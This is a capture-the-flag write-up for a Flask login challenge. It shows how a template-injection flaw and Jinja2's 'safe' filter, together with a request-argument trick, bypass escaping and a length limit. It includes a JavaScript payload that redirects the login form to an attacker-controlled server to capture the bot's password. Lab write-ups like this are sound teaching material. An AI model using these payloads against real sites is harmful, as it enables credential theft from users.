![image](https://user-images.githubusercontent.com/64314534/234607512-23006716-acb8-4149-86f8-4e0532e85e6d.png)

When we enter the challenge we will find a simple login page with a number of failed logins

<br>

![image](https://user-images.githubusercontent.com/64314534/234608009-f52b5e94-ec1c-4a0d-a5ca-227bbe8f79b5.png)

after trying a simple creds   `admin:admin`

we will got : `wrong username or password` and the number of failed login has been increased .

# Let's review the code  (Flask)
<br>

![image](https://user-images.githubusercontent.com/64314534/234610042-578eb5ff-8b3b-44e3-ac9d-1d04adf110e0.png)

<br>

The code is very simple let's divde it into pieces to explain it 

### First part : 
<br>

![image](https://user-images.githubusercontent.com/64314534/234610860-54a13eeb-b6f7-4960-ae89-0d3a257667a2.png)

<br>

The application import some libraries like Flask , escape and render_template_string (keep in mind that this function is vulnerable to ssti) and then there is an html template which had a variable called fails and also a place for a string 


<br>



### Second part :
<br>

![image](https://user-images.githubusercontent.com/64314534/234611740-25594be1-a173-4e42-9542-c3400257dde4.png)

<br>

The get route of the index is doing the following : 

- get the fails variable which had the number of failed logins 
- check if there is a parameter called message and then check if it's length is equal or greater than 25 and if this it will send the index page with the number of fails
- if the message param's length less than 25 it will pass the message to the escape() function which will filtered it against xss then it will render the template and append the message to it in the place of string (format string) and this will cause an ssti vulnerability
- but since they provide a bot so, we don't need to get RCE or something 

### Third part :
<br>

![image](https://user-images.githubusercontent.com/64314534/234614375-161e31e3-e654-4f5f-a306-184395c48c6f.png)

<br>

this is the login function and it's broken as we can see it's not working, just increasing the number of failed logins

### The bot code 
<br>

![image](https://user-images.githubusercontent.com/64314534/234615117-8b579722-bcf2-4c97-a2ae-1232d95ee3f2.png)


<br>

As we can see from the selected parts the bot logins with the username:admin and the password : flag 
so, we need to get xss to change the form action and get the password which is the flag : D

i opened my burp suite to do some debugging with the ssti 

<br>

![image](https://user-images.githubusercontent.com/64314534/234615966-57a7de01-732b-4ac0-99d3-ee4bf3c92a51.png)

![image](https://user-images.githubusercontent.com/64314534/234616110-df9aa7c2-c4c9-4f59-959e-b00b2ee57e8e.png)


<br>

As you see we can confirm that the message parameter is not vulnerable to Xss but vulnerable to ssti, TBH iam not very good at flask templates but i know there is something called jinja2 filters (flask using jinja2 as a template engine)

Ex : {{thing|filter}}   : {{-123456|abs}} will return 123456 (the absolute value of the number)

after searching in jinja2 filters i found that `safe` filter will prevent the element from being escaped 
<br>

![image](https://user-images.githubusercontent.com/64314534/234619129-867a7228-a749-4967-84bf-49bc06ec30ac.png)

![image](https://user-images.githubusercontent.com/64314534/234619458-93d34009-d11c-4c68-aa8f-a32d9f019463.png)

Still we had the length problem so we can refer to another parameter to bypass the length by this payload : {{request.args.r}} 

- Final payload : {{request.args.r|safe}}

<br>

![image](https://user-images.githubusercontent.com/64314534/234620142-6198e5f4-22da-42db-8e34-81f5770779b0.png)

<br>
and we now bypassed all filters for this challenge let's see how we can edit the form action to be our server we can use this simple js code 


`<script>document.forms[0].action='https://ourserver'</script>`

<br>
But after i tried it in the browser i got this error in the console : 
<br>

![image](https://user-images.githubusercontent.com/64314534/234620959-5366f456-f7df-4049-b774-f01a1201d425.png)

<br>

Do you know why ?? Because the script is executed before the login form is loaded. so we will make a quick modify to our script :

window.onload =function(){document.forms[0].action="http://our_server"};
<br>

and i got the flag : ) 

<br>

![image](https://user-images.githubusercontent.com/64314534/234622519-3465bb6e-25ba-461b-845f-b3cbb87cbe17.png)


